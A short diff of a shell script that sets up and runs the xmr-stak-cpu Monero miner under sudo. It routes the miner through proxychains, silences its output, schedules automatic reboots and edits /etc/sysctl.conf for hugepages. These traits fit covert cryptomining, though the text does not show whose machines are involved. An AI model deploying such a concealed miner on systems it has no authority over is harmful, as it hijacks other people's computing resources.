@@ -21,9 +21,9 @@ then
 	# sudo sed -i -e "\$ahttp    $VAR_PI    $VAR_PO    $VAR_PO  $VAR_PP" /m/test01/proxychains-ng/src/proxychains.conf
 	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
         ( sleep 10800 ; sudo reboot ) & 
-	cd /m/test01/xmr-stak-cpu/bin/
+	cd /m/test01/xmr-stak-cpu/bin
         sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
-#       sudo reboot   
+        sudo reboot   
 else
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
         sudo /bin/su -c "echo 'xxxxx' >> /flag2"
